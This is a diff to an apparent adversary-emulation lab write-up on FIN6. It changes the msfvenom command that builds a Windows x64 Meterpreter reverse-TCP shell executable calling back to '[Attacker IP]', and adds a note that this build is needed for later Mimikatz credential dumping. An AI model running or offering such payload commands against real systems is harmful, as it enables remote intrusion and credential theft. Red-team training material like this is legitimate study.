@@ -19,7 +19,7 @@ As FIN6 appears to be monetarily motivated, they take a pragmatic approach towar
 
 FIN6 has made use of CobaltStrike and Metasploit. For this demonstration, we'll create initial payload using Metasploit’s [**Msfvenom**](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html).
 
-_MSFvenom_ is a combination of Msfpayload and Msfencode, putting both of these tools into a single Framework instance. The advantages of Msfvenom are:
+_MsfVenom_ is a combination of Msfpayload and Msfencode, putting both of these tools into a single Framework instance. The advantages of Msfvenom are:
 
 One single tool
 Standardized command line options
@@ -46,8 +46,12 @@ To see what payloads are available from Framework, you can do:
 Below is the typical syntax to use msfvenom:
 
 ```bash
-./msfvenom -p windows/meterpreter/reverse_tcp lhost=[Attacker IP] lport=4444 -f exe -o /tmp/my_payload.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=[Attacker IP] lport=4444 -f exe -o /tmp/my_payload.exe
 ```
+
+> In order to dump credentials with Mimikatz later in this lab, we need to use the x64 version of Windows Meterpreter TCP reverse shell
+{: .prompt-info }
+
 ![]({{site.baseurl}}/assets/img/2023-08-02-FIN6 Adversary Emulation - Phase 1/2023-08-02-Metasploit_MsfVenom_Payload.png){:width="100%"}
 
 ### 1.4 - Generate Payload Handler
